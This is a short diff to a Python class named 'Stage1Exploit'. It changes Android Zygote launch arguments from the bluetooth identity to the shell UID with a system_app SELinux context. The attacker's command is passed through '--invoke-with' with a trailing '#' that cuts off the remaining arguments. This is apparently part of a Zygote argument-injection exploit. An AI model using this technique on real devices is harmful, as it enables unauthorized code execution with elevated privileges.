@@ -189,14 +189,14 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=1002",
-            "--setgid=1002",
+            "--setuid=2000",
+            "--setgid=2000",
             "--setgroups=3003",
             "--target-sdk-version=28",
-            "--app-data-dir=/data/user/0/com.android.bluetooth",
+            "--app-data-dir=/data/user/0/com.android.shell",
             "--runtime-args",
-            "--nice-name=bluetooth",
-            "--seinfo=platform:complete",
+            "--nice-name=shell",
+            "--seinfo=platform:privapp:system_app:targetSdkVersion=28:complete",
             "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
